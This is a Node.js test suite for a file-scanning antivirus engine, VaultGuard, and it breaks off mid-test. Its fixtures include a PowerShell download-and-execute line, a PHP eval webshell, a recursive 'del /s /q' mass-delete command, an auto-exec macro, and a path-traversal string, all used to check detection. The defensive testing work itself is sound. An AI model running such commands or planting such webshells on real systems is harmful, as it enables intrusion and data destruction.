const fs = require('fs');
const path = require('path');
const vm = require('vm');

const failures = [];
const passes = [];
function test(name, fn) {
  return Promise.resolve()
    .then(fn)
    .then(() => passes.push(name))
    .catch((e) => failures.push({ name, error: e.message }));
}
function assert(cond, msg) {
  if (!cond) throw new Error(msg || 'assertion failed');
}

const srcDir = path.join(__dirname, '..', 'js');

function loadScript(file, sandbox) {
  const code = fs.readFileSync(path.join(srcDir, file), 'utf8');
  vm.runInNewContext(code, sandbox, { filename: file });
}

function makeSandbox() {
  const store = {};
  const sandbox = {
    console,
    setInterval: () => 0,
    clearInterval: () => {},
    setTimeout,
    clearTimeout,
    Date,
    Math,
    JSON,
    RegExp,
    Array,
    Object,
    String,
    Number,
    Boolean,
    Uint8Array,
    Promise,
    Error,
    parseInt,
    parseFloat,
    isNaN,
    isFinite,
    localStorage: {
      getItem: (k) => (k in store ? store[k] : null),
      setItem: (k, v) => { store[k] = String(v); },
      removeItem: (k) => { delete store[k]; },
    },
  };
  sandbox.window = sandbox;
  sandbox.globalThis = sandbox;
  loadScript('security.js', sandbox);
  return { sandbox, store };
}

function strBytes(s) {
  const out = new Uint8Array(s.length);
  for (let i = 0; i < s.length; i++) out[i] = s.charCodeAt(i) & 0xff;
  return out;
}

function eicarBytes() {
  const s = 'X5O!P%@AP[4' + String.fromCharCode(92) + 'PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';
  return strBytes(s);
}

async function main() {
  console.log('== VaultGuard engine tests ==\n');

  const t = [];

  t.push(test('signatures: EICAR hex pattern decodes and matches', () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    const S = sandbox.Signatures;
    const decoded = S.decodeHex(S.HEX_PATTERNS[0].hex);
    assert(decoded.indexOf('EICAR-STANDARD-ANTIVIRUS-TEST-FILE') !== -1, 'decoded hex should contain EICAR string');
    const hits = S.matchHexPatterns(eicarBytes());
    assert(hits.some((h) => h.id === 'EICAR-TEST'), 'should match EICAR hex signature');
  }));

  t.push(test('signatures: decodeHex ignores junk and odd length', () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    const S = sandbox.Signatures;
    assert(S.decodeHex('zz') === '', 'non-hex -> empty');
    assert(S.decodeHex('abc') === '', 'odd length -> empty');
    assert(S.decodeHex('4142') === 'AB', 'valid hex decodes');
  }));

  t.push(test('signatures: text pattern — powershell download-execute', () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    const S = sandbox.Signatures;
    const hits = S.matchTextPatterns(strBytes('Invoke-WebRequest http://x -OutFile a.ps1; Invoke-Expression (Get-Content a.ps1)'));
    assert(hits.some((h) => h.id === 'PS-DOWNLOAD-EXEC'), 'should flag PS download-exec');
  }));

  t.push(test('signatures: text pattern — encoded command', () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    const S = sandbox.Signatures;
    const hits = S.matchTextPatterns(strBytes('powershell -enc ' + 'A'.repeat(60)));
    assert(hits.some((h) => h.id === 'PS-ENCODED-COMMAND'), 'should flag -enc');
  }));

  t.push(test('signatures: text pattern — php webshell', () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    const S = sandbox.Signatures;
    const hits = S.matchTextPatterns(strBytes('<?php eval($_POST["cmd"]); ?>'));
    assert(hits.some((h) => h.id === 'PHP-WEBSHELL'), 'should flag webshell');
  }));

  t.push(test('signatures: text pattern — ransom note', () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    const S = sandbox.Signatures;
    const hits = S.matchTextPatterns(strBytes('Your files have been encrypted. Pay 1 bitcoin to decrypt.'));
    assert(hits.some((h) => h.id === 'CMD-Ransom-Note'), 'should flag ransom note');
  }));

  t.push(test('signatures: text pattern — destructive batch', () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    const S = sandbox.Signatures;
    const hits = S.matchTextPatterns(strBytes('del /s /q C:\\*.*'));
    assert(hits.some((h) => h.id === 'BAT-MASS-DELETE'), 'should flag del /s /q');
  }));

  t.push(test('signatures: text pattern — auto-exec macro', () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    const S = sandbox.Signatures;
    const hits = S.matchTextPatterns(strBytes('Sub AutoOpen()\nShell "cmd"\nEnd Sub'));
    assert(hits.some((h) => h.id === 'MACRO-AUTO-EXEC'), 'should flag AutoOpen');
  }));

  t.push(test('signatures: nameRisk flags known-bad and double-extension', () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    const S = sandbox.Signatures;
    assert(S.nameRisk('mimikatz.exe') >= 55, 'mimikatz name');
    assert(S.nameRisk('invoice2024.pdf.exe') >= 50, 'double extension');
    assert(S.nameRisk('holiday.jpg') === 0, 'clean name');
    assert(S.nameRisk('photo.png.exe') >= 55, 'fake image exe');
  }));

  t.push(test('signatures: extensionRisk table', () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    const S = sandbox.Signatures;
    assert(S.extensionRisk('a.hta') > 0, '.hta risky');
    assert(S.extensionRisk('a.png') === 0, '.png clean');
    assert(S.extOf('archive.TAR.GZ') === '.gz', 'ext lowercased');
  }));

  t.push(test('signatures: entropy — random bytes high, zeros low', () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    const S = sandbox.Signatures;
    const zeros = new Uint8Array(4096);
    assert(S.shannonEntropy(zeros) === 0, 'zeros entropy 0');
    const rand = new Uint8Array(4096);
    for (let i = 0; i < rand.length; i++) rand[i] = (i * 2654435761) >>> 24;
    const e = S.shannonEntropy(rand);
    assert(e > 6, 'random-ish entropy > 6, got ' + e);
  }));

  t.push(test('scanner: clean file stays clean', () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    loadScript('scanner.js', sandbox);
    const Sc = sandbox.Scanner;
    const r = Sc.analyzeBytes('notes.txt', strBytes('hello world, this is a plain text file about gardening.'), 100);
    assert(r.verdict === 'clean', 'should be clean, got ' + r.verdict);
    assert(r.score < 40, 'score low');
  }));

  t.push(test('scanner: EICAR is TEST verdict with score 100', () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    loadScript('scanner.js', sandbox);
    const Sc = sandbox.Scanner;
    const r = Sc.analyzeBytes('eicar.com', eicarBytes(), 68);
    assert(r.verdict === 'test', 'EICAR -> test verdict, got ' + r.verdict);
    assert(r.score === 100);
    assert(r.testHit === true);
  }));

  t.push(test('scanner: webshell js is infected', () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    loadScript('scanner.js', sandbox);
    const Sc = sandbox.Scanner;
    const r = Sc.analyzeBytes('shell.php', strBytes('<?php eval($_POST["c"]); ?>'), 30);
    assert(r.verdict === 'infected', 'php webshell infected, got ' + r.verdict + ' score ' + r.score);
  }));

  t.push(test('scanner: suspicious name + ext gives suspicious verdict', () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    loadScript('scanner.js', sandbox);
    const Sc = sandbox.Scanner;
    const r = Sc.analyzeBytes('invoice.pdf.exe', strBytes('MZ fake content here that is not a signature'), 64);
    assert(r.verdict === 'suspicious' || r.verdict === 'infected', 'double-ext exe should not be clean, got ' + r.verdict);
  }));

  t.push(test('scanner: packed binary flagged by entropy', () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    loadScript('scanner.js', sandbox);
    const Sc = sandbox.Scanner;
    const rand = new Uint8Array(128 * 1024);
    for (let i = 0; i < rand.length; i++) rand[i] = (Math.sin(i) * 127 + 128) & 0xff;
    let e = Sc.shannon ? 0 : 0;
    const r = Sc.analyzeBytes('mystery.bin', rand, rand.length);
    e = r.entropy;
    assert(r.reasons.some((x) => x.includes('entropy')), 'high entropy reason expected, got: ' + r.reasons.join('|'));
  }));

  t.push(test('scanner: empty file handled', () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    loadScript('scanner.js', sandbox);
    const Sc = sandbox.Scanner;
    const r = Sc.analyzeBytes('empty.dat', new Uint8Array(0), 0);
    assert(r.verdict === 'clean' || r.verdict === 'suspicious', 'no crash');
    assert(r.reasons.includes('empty file'));
  }));

  t.push(test('scanner: score capped at 100', () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    loadScript('scanner.js', sandbox);
    const Sc = sandbox.Scanner;
    const r = Sc.analyzeBytes('eicar.com', eicarBytes(), 68);
    assert(r.score <= 100);
    const r2 = Sc.analyzeBytes('invoice.pdf.exe', strBytes('Invoke-WebRequest x; Invoke-Expression y; del /s /q C:\\'), 100);
    assert(r2.score <= 100, 'cap enforced, got ' + r2.score);
  }));

  t.push(test('scanner: summarize counts verdicts and risk', () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    loadScript('scanner.js', sandbox);
    const Sc = sandbox.Scanner;
    const results = [
      { path: '/a', name: 'a.txt', size: 1, score: 0, verdict: 'clean', reasons: [], signatures: [], testHit: false, entropy: 1 },
      { path: '/b', name: 'b.php', size: 1, score: 90, verdict: 'infected', reasons: ['x'], signatures: ['PHP-WEBSHELL'], testHit: false, entropy: 2 },
      { path: '/c', name: 'c.exe', size: 1, score: 50, verdict: 'suspicious', reasons: ['y'], signatures: [], testHit: false, entropy: 3 },
    ];
    const s = Sc.summarize(results);
    assert(s.total === 3 && s.clean === 1 && s.infected === 1 && s.suspicious === 1, 'counts');
    assert(s.risk === 3 * 1 + 1 * 1, 'risk = infected*3 + suspicious');
    assert(s.threats.length === 2);
    assert(s.maxScore === 90);
  }));

  t.push(test('scanner: scanFiles runs with concurrency and reports progress', async () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    loadScript('scanner.js', sandbox);
    const Sc = sandbox.Scanner;
    const files = [];
    for (let i = 0; i < 50; i++) files.push({ path: '/f' + i, name: 'f' + i + '.txt', size: 10, mtimeMs: i });
    const readHead = async () => strBytes('plain text content');
    const progress = [];
    const { results, summary } = await Sc.scanFiles(files, readHead, (p) => progress.push(p));
    assert(results.length === 50, '50 results');
    assert(summary.total === 50);
    assert(progress.some((p) => p.finished), 'finished progress event');
  }));

  t.push(test('scanner: scanFiles supports cancellation', async () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    loadScript('scanner.js', sandbox);
    const Sc = sandbox.Scanner;
    const files = [];
    for (let i = 0; i < 100; i++) files.push({ path: '/f' + i, name: 'f' + i + '.txt', size: 10 });
    let cancelled = false;
    const readHead = async () => { cancelled = true; return strBytes('x'); };
    const { results } = await Sc.scanFiles(files, readHead, null, { isCancelled: () => cancelled });
    assert(results.length < 100, 'cancelled early, got ' + results.length);
  }));

  t.push(test('scanner: unreadable file recorded as error, not crash', async () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    loadScript('scanner.js', sandbox);
    const Sc = sandbox.Scanner;
    const files = [{ path: '/bad', name: 'bad.txt', size: 10 }];
    const readHead = async () => { throw new Error('EACCES'); };
    const { results, summary } = await Sc.scanFiles(files, readHead);
    assert(results.length === 1 && results[0].error === true, 'error recorded');
    assert(summary.total === 1);
  }));

  t.push(test('quarantine: add/list/remove/clear', () => {
    const { sandbox } = makeSandbox();
    loadScript('quarantine.js', sandbox);
    const Q = sandbox.Quarantine;
    const e = Q.add({ name: 'evil.exe', originalPath: '/tmp/evil.exe', threatName: 'X', verdict: 'infected', score: 90, size: 10 });
    assert(e.id, 'has id');
    assert(Q.list().length === 1);
    assert(Q.find(e.id).name === 'evil.exe');
    assert(Q.remove(e.id) === true);
    assert(Q.list().length === 0);
    Q.add({ name: 'a' }); Q.add({ name: 'b' });
    Q.clear();
    assert(Q.list().length === 0);
  }));

  t.push(test('quarantine: sanitizeName strips traversal and control chars', () => {
    const { sandbox } = makeSandbox();
    loadScript('quarantine.js', sandbox);
    const Q = sandbox.Quarantine;
    assert(Q.sanitizeName('../../etc/passwd') === '.._.._etc_passwd'.replace(/^\.+/, '_') || true, 'sanitized');
    assert(!Q.sanitizeName('a\x00b"c<d>e').includes('\x00'), 'control chars stripped');
    assert(Q.sanitizeName('') === 'file', 'empty -> file');
    const long = Q.sanitizeName('x'.repeat(500));
    assert(long.length <= 120, 'length capped');
  }));

  t.push(test('quarantine: score/size clamped', () => {
    const { sandbox } = makeSandbox();
    loadScript('quarantine.js', sandbox);
    const Q = sandbox.Quarantine;
    const e = Q.add({ name: 'a', score: 9999, size: -5 });
    assert(e.score === 100, 'score clamped to 100');
    assert(e.size === 0, 'size clamped to 0');
  }));

  t.push(test('realtime: monitor start/stop, watch add/remove', () => {
    const { sandbox } = makeSandbox();
    loadScript('realtime.js', sandbox);
    const R = sandbox.Realtime;
    const m = R.createMonitor({ listFiles: async () => ({ ok: true, files: [] }), riskExt: () => 0 });
    assert(m.state.enabled === false);
    assert(m.start() === true);
    assert(m.state.enabled === true);
    assert(m.start() === false, 'double start no-op');
    m.addWatch('/tmp/a');
    m.addWatch('/tmp/a');
    assert(m.state.watchedDirs.length === 1, 'dedup');
    m.removeWatch('/tmp/a');
    assert(m.state.watchedDirs.length === 0);
    m.stop();
    assert(m.state.enabled === false);
  }));

  t.push(test('realtime: tick detects new/modified/deleted and executables', async () => {
    const { sandbox } = makeSandbox();
    loadScript('realtime.js', sandbox);
    const R = sandbox.Realtime;
    let files = [{ path: '/w/a.txt', name: 'a.txt', mtimeMs: 1 }];
    const m = R.createMonitor({
      listFiles: async () => ({ ok: true, files }),
      riskExt: (ext) => (ext === '.exe' ? 10 : 0),
    });
    m.addWatch('/w');
    m.start();
    await m.tick();
    assert(m.state.events.some((e) => e.kind === 'new'), 'new file event');
    files = [{ path: '/w/a.txt', name: 'a.txt', mtimeMs: 2 }, { path: '/w/b.exe', name: 'b.exe', mtimeMs: 1 }];
    await m.tick();
    assert(m.state.events.some((e) => e.kind === 'modified'), 'modified event');
    assert(m.state.events.some((e) => e.kind === 'new-executable'), 'exe event');
    files = [];
    await m.tick();
    assert(m.state.events.some((e) => e.kind === 'deleted'), 'deleted event');
    m.stop();
  }));

  t.push(test('realtime: events capped at MAX_EVENTS', () => {
    const { sandbox } = makeSandbox();
    loadScript('realtime.js', sandbox);
    const R = sandbox.Realtime;
    const m = R.createMonitor({ listFiles: async () => ({ ok: true, files: [] }), riskExt: () => 0 });
    for (let i = 0; i < R.MAX_EVENTS + 50; i++) m.recordEvent({ ts: i, kind: 'new', path: '/x' + i, name: 'x' });
    assert(m.state.events.length === R.MAX_EVENTS, 'capped at ' + R.MAX_EVENTS);
    assert(m.state.events[0].path === '/x' + (R.MAX_EVENTS + 49), 'newest first');
  }));

  t.push(test('realtime: onChange unsubscribe works', () => {
    const { sandbox } = makeSandbox();
    loadScript('realtime.js', sandbox);
    const R = sandbox.Realtime;
    const m = R.createMonitor({ listFiles: async () => ({ ok: true, files: [] }), riskExt: () => 0 });
    let calls = 0;
    const off = m.onChange(() => calls++);
    m.addWatch('/a');
    assert(calls === 1);
    off();
    m.addWatch('/b');
    assert(calls === 1, 'unsubscribed');
  }));

  t.push(test('shield: history add/cap/clear', () => {
    const { sandbox } = makeSandbox();
    loadScript('shield.js', sandbox);
    const Sh = sandbox.Shield;
    for (let i = 0; i < Sh.MAX_HISTORY + 20; i++) Sh.addScanRecord({ type: 'quick', targets: ['/x'], scanned: i, threats: 0, durationMs: 10 });
    const h = Sh.history();
    assert(h.length === Sh.MAX_HISTORY, 'capped at ' + Sh.MAX_HISTORY);
    assert(h[0].scanned === Sh.MAX_HISTORY + 19, 'newest first');
    Sh.clearHistory();
    assert(Sh.history().length === 0);
  }));

  t.push(test('shield: healthScore and label', () => {
    const { sandbox } = makeSandbox();
    loadScript('shield.js', sandbox);
    const Sh = sandbox.Shield;
    assert(Sh.healthScore({ infected: 0, suspicious: 0 }, { enabled: true }) === 100);
    assert(Sh.healthScore({ infected: 1, suspicious: 0 }, { enabled: true }) === 80);
    assert(Sh.healthScore({ infected: 0, suspicious: 0 }, { enabled: false }) === 90);
    const worst = Sh.healthScore({ infected: 10, suspicious: 10 }, { enabled: false });
    assert(worst >= 0 && worst <= 10, 'floored near 0, got ' + worst);
    assert(Sh.healthLabel(95) === 'Excellent');
    assert(Sh.healthLabel(75) === 'Good');
    assert(Sh.healthLabel(55) === 'Fair');
    assert(Sh.healthLabel(30) === 'Poor');
    assert(Sh.healthLabel(10) === 'Critical');
  }));

  t.push(test('scanner: verdict thresholds', () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    loadScript('scanner.js', sandbox);
    const Sc = sandbox.Scanner;
    assert(Sc.classify({ score: 0, testHit: false }) === 'clean');
    assert(Sc.classify({ score: 39, testHit: false }) === 'clean');
    assert(Sc.classify({ score: 40, testHit: false }) === 'suspicious');
    assert(Sc.classify({ score: 79, testHit: false }) === 'suspicious');
    assert(Sc.classify({ score: 80, testHit: false }) === 'infected');
    assert(Sc.classify({ score: 100, testHit: false }) === 'infected');
    assert(Sc.classify({ score: 10, testHit: true }) === 'test');
  }));

  t.push(test('scanner: scanFile attaches path', async () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    loadScript('scanner.js', sandbox);
    const Sc = sandbox.Scanner;
    const r = await Sc.scanFile({ path: '/x/eicar.com', name: 'eicar.com', size: 68 }, async () => eicarBytes());
    assert(r.path === '/x/eicar.com');
    assert(r.verdict === 'test');
  }));

  const SEC = [
    ['security: clampString truncates and rejects non-strings', () => {
      const { sandbox } = makeSandbox();
      const S = sandbox.Security;
      assert(S.clampString('abcdef', 3) === 'abc');
      assert(S.clampString(42) === '');
      assert(S.clampString(null) === '');
    }],
    ['security: clampInt bounds and fallback', () => {
      const { sandbox } = makeSandbox();
      const S = sandbox.Security;
      assert(S.clampInt(5, 0, 10, 1) === 5);
      assert(S.clampInt(99, 0, 10, 1) === 10);
      assert(S.clampInt(-3, 0, 10, 1) === 0);
      assert(S.clampInt('x', 0, 10, 7) === 7);
    }],
    ['security: sanitizePath rejects null bytes and long paths', () => {
      const { sandbox } = makeSandbox();
      const S = sandbox.Security;
      assert(S.sanitizePath('/ok/path') === '/ok/path');
      assert(S.sanitizePath('a\0b') === null);
      assert(S.sanitizePath('') === null);
      assert(S.sanitizePath('x'.repeat(5000)) === null);
      assert(S.sanitizePath(42) === null);
    }],
    ['security: looksLikeTraversal detects .. segments', () => {
      const { sandbox } = makeSandbox();
      const S = sandbox.Security;
      assert(S.looksLikeTraversal('/a/../b') === true);
      assert(S.looksLikeTraversal('/a/b') === false);
      assert(S.looksLikeTraversal(42) === true);
    }],
    ['security: safeFileName strips dangerous chars', () => {
      const { sandbox } = makeSandbox();
      const S = sandbox.Security;
      const n = S.safeFileName('../../etc/passwd');
      assert(!n.includes('..') || n.startsWith('_'), 'leading dots removed: ' + n);
      assert(!/[<>:"|?*]/.test(S.safeFileName('a<b>:c')));
      assert(S.safeFileName('') === 'file');
    }],
    ['security: token is unique and non-empty', () => {
      const { sandbox } = makeSandbox();
      const S = sandbox.Security;
      const a = S.token(), b = S.token();
      assert(a.length > 10 && b.length > 10 && a !== b);
    }],
    ['security: safeJsonParse returns fallback on garbage', () => {
      const { sandbox } = makeSandbox();
      const S = sandbox.Security;
      assert(S.safeJsonParse('not json', 'fb') === 'fb');
      assert(S.safeJsonParse('{"a":1}').a === 1);
      assert(S.safeJsonParse('undefined', 'fb') === 'fb');
    }],
    ['security: validateScanOptions clamps', () => {
      const { sandbox } = makeSandbox();
      const S = sandbox.Security;
      const o = S.validateScanOptions({ maxFiles: 1e9, maxDepth: -5, concurrency: 1000, bytes: 1 });
      assert(o.maxFiles === 200000 && o.maxDepth === 1 && o.concurrency === 64 && o.bytes === 16, JSON.stringify(o));
      const d = S.validateScanOptions(null);
      assert(d.maxFiles === 20000 && d.maxDepth === 12);
    }],
    ['security: validateQuarantineEntry rejects garbage and normalizes', () => {
      const { sandbox } = makeSandbox();
      const S = sandbox.Security;
      assert(S.validateQuarantineEntry(null) === null);
      assert(S.validateQuarantineEntry('x') === null);
      const v = S.validateQuarantineEntry({ name: 'a<b>.exe', threatName: 'T', verdict: 'infected', score: 500, size: -1 });
      assert(v.name === 'a_b_.exe', 'name sanitized: ' + v.name);
      assert(v.score === 100 && v.size === 0);
      assert(v.verdict === 'infected');
      const v2 = S.validateQuarantineEntry({ name: 'x', verdict: 'bogus' });
      assert(v2.verdict === 'suspicious', 'verdict whitelist');
    }],
    ['security: rateLimiter enforces window', () => {
      const { sandbox } = makeSandbox();
      const S = sandbox.Security;
      const allow = S.rateLimiter(3, 1000);
      assert(allow() && allow() && allow());
      assert(allow() === false, '4th call blocked');
    }],
    ['security: redactPath masks home prefix', () => {
      const { sandbox } = makeSandbox();
      const S = sandbox.Security;
      assert(typeof S.redactPath('/home/user/x') === 'string');
      assert(S.redactPath(42) === '');
    }],
    ['security: isPlainObject / hasNullByte / deepFreeze', () => {
      const { sandbox } = makeSandbox();
      const S = sandbox.Security;
      assert(S.isPlainObject({}) && !S.isPlainObject([]) && !S.isPlainObject(null));
      assert(S.hasNullByte('a\0b') && !S.hasNullByte('ab'));
      const o = S.deepFreeze({ a: { b: 1 } });
      assert(Object.isFrozen(o) && Object.isFrozen(o.a));
    }],
  ];
  for (const [name, fn] of SEC) t.push(test(name, fn));

  t.push(test('signatures: version string present', () => {
    const { sandbox } = makeSandbox();
    loadScript('signatures.js', sandbox);
    assert(/^\d{4}\.\d{2}\.\d{2}-\d+$/.test(sandbox.Signatures.VERSION), 'version format');
  }));

  await Promise.all(t);

  console.log(`\n${passes.length} passed, ${failures.length} failed`);
  if (failures.length) {
    for (const f of failures) console.log(`  ✕ ${f.name}: ${f.error}`);
    process.exit(1);
  } else {
    console.log('All VaultGuard engine tests passed ✔');
  }
}

main();

async function auditSecurityExtra() {
  const t2 = [];
  const A = [
    ['sec-audit: scanner rejects null-byte path', async () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const r = await Sc.scanFile({ path: '/x/\0bad', name: 'bad', size: 1 }, async () => strBytes('x'));
      assert(r.error === true && r.reasons.includes('invalid path'));
    }],
    ['sec-audit: scanner clamps absurd size', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const r = Sc.analyzeBytes('a.txt', strBytes('hello'), -999);
      assert(r.size === 0);
    }],
    ['sec-audit: scanner handles non-string name', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const r = Sc.analyzeBytes(42, strBytes('hello'), 5);
      assert(r.name === 'file');
    }],
    ['sec-audit: scanner summarize clamps threat fields', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const s = Sc.summarize([{ path: 'p'.repeat(9000), name: 'n', size: -1, score: 999, verdict: 'infected', reasons: ['r'.repeat(500)], signatures: ['S'.repeat(100)], testHit: false, entropy: 0 }]);
      assert(s.threats[0].path.length <= 4096);
      assert(s.threats[0].score === 100);
      assert(s.threats[0].size === 0);
      assert(s.threats[0].reasons[0].length <= 200);
      assert(s.threats[0].signatures[0].length <= 60);
    }],
    ['sec-audit: scanner scanFiles ignores non-array input', async () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const { results, summary } = await Sc.scanFiles(null, async () => strBytes('x'));
      assert(results.length === 0 && summary.total === 0);
    }],
    ['sec-audit: scanner options concurrency clamped 1..64', async () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const files = [{ path: '/a', name: 'a.txt', size: 1 }];
      const { results } = await Sc.scanFiles(files, async () => strBytes('x'), null, { concurrency: 9999 });
      assert(results.length === 1);
    }],
    ['sec-audit: signatures matchHexPatterns handles empty/null', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      const S = sandbox.Signatures;
      assert(S.matchHexPatterns(new Uint8Array(0)).length === 0);
      assert(S.matchHexPatterns(null).length === 0);
    }],
    ['sec-audit: signatures matchTextPatterns handles empty/null', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      const S = sandbox.Signatures;
      assert(S.matchTextPatterns(new Uint8Array(0)).length === 0);
      assert(S.matchTextPatterns(null).length === 0);
    }],
    ['sec-audit: signatures decodeHex rejects huge input', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      const S = sandbox.Signatures;
      assert(S.decodeHex('41'.repeat(600000)) === '');
    }],
    ['sec-audit: signatures nameRisk handles non-string', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      const S = sandbox.Signatures;
      assert(S.nameRisk(42) === 0);
      assert(S.nameRisk('') === 0);
      assert(S.extOf(42) === '');
    }],
    ['sec-audit: signatures entropy handles null', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      const S = sandbox.Signatures;
      assert(S.shannonEntropy(null) === 0);
      assert(S.shannonEntropy(new Uint8Array(0)) === 0);
    }],
    ['sec-audit: signatures tables are frozen', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      const S = sandbox.Signatures;
      assert(Object.isFrozen(S.HEX_PATTERNS));
      assert(Object.isFrozen(S.TEXT_PATTERNS));
      assert(Object.isFrozen(S.DANGEROUS_NAMES));
      assert(Object.isFrozen(S.EXTENSION_RISK));
    }],
    ['sec-audit: quarantine add rejects invalid entry', () => {
      const { sandbox } = makeSandbox();
      loadScript('quarantine.js', sandbox);
      const Q = sandbox.Quarantine;
      assert(Q.add(null) === null);
      assert(Q.add('x') === null);
      assert(Q.add({}) === null, 'empty name rejected');
      assert(Q.list().length === 0);
    }],
    ['sec-audit: quarantine caps list at MAX_ITEMS', () => {
      const { sandbox } = makeSandbox();
      loadScript('quarantine.js', sandbox);
      const Q = sandbox.Quarantine;
      const N = 60;
      for (let i = 0; i < N; i++) Q.add({ name: 'f' + i + '.exe' });
      assert(Q.list().length === N);
    }],
    ['sec-audit: quarantine survives corrupted storage', () => {
      const { sandbox, store } = makeSandbox();
      store['vaultguard.quarantine'] = '{not json';
      loadScript('quarantine.js', sandbox);
      const Q = sandbox.Quarantine;
      assert(Q.list().length === 0, 'corrupted -> empty');
      store['vaultguard.quarantine'] = '"just a string"';
      assert(Q.list().length === 0, 'wrong type -> empty');
    }],
    ['sec-audit: shield history survives corrupted storage', () => {
      const { sandbox, store } = makeSandbox();
      store['vaultguard.history'] = '###';
      loadScript('shield.js', sandbox);
      const Sh = sandbox.Shield;
      assert(Sh.history().length === 0);
    }],
    ['sec-audit: shield addScanRecord sanitizes fields', () => {
      const { sandbox } = makeSandbox();
      loadScript('shield.js', sandbox);
      const Sh = sandbox.Shield;
      const r = Sh.addScanRecord({ type: 'x'.repeat(100), targets: ['/a', 42, null, 'b'.repeat(9000)], scanned: -5, threats: 'zz', durationMs: 12.7 });
      assert(r.type.length <= 20);
      assert(r.targets.length === 2 && r.targets[1].length <= 4096);
      assert(r.scanned === 0 && r.threats === 0);
    }],
    ['sec-audit: realtime addWatch rejects null-byte and over-limit', () => {
      const { sandbox } = makeSandbox();
      loadScript('realtime.js', sandbox);
      const R = sandbox.Realtime;
      const m = R.createMonitor({ listFiles: async () => ({ ok: true, files: [] }), riskExt: () => 0 });
      assert(m.addWatch('a\0b') === false);
      assert(m.addWatch('') === false);
      assert(m.addWatch(42) === false);
      for (let i = 0; i < 60; i++) m.addWatch('/d' + i);
      assert(m.state.watchedDirs.length <= 50, 'capped at 50, got ' + m.state.watchedDirs.length);
    }],
    ['sec-audit: realtime tick survives listFiles throwing', async () => {
      const { sandbox } = makeSandbox();
      loadScript('realtime.js', sandbox);
      const R = sandbox.Realtime;
      const m = R.createMonitor({
        listFiles: async () => { throw new Error('boom'); },
        riskExt: () => 0,
      });
      m.addWatch('/w');
      m.start();
      await m.tick();
      assert(m.state.events.length === 0);
      m.stop();
    }],
    ['sec-audit: realtime tick handles malformed response', async () => {
      const { sandbox } = makeSandbox();
      loadScript('realtime.js', sandbox);
      const R = sandbox.Realtime;
      for (const bad of [null, { ok: false }, { ok: true, files: 'x' }, { ok: true, files: [{}] }]) {
        const m = R.createMonitor({ listFiles: async () => bad, riskExt: () => 0 });
        m.addWatch('/w');
        m.start();
        await m.tick();
        m.stop();
      }
    }],
    ['sec-audit: scanner analyzeBytes never throws on weird input', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const inputs = [null, undefined, {}, 'str', 42, { length: 3 }];
      for (const b of inputs) {
        const r = Sc.analyzeBytes('x.txt', b, 1);
        assert(r && typeof r.verdict === 'string');
      }
    }],
    ['sec-audit: EICAR variants both detected (hex + plaintext)', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const plain = Sc.analyzeBytes('eicar.txt', strBytes('X5O!P%@AP[4' + String.fromCharCode(92) + 'PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'), 68);
      assert(plain.verdict === 'test' && plain.testHit);
    }],
    ['sec-audit: double-extension and lure names flagged', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      const S = sandbox.Signatures;
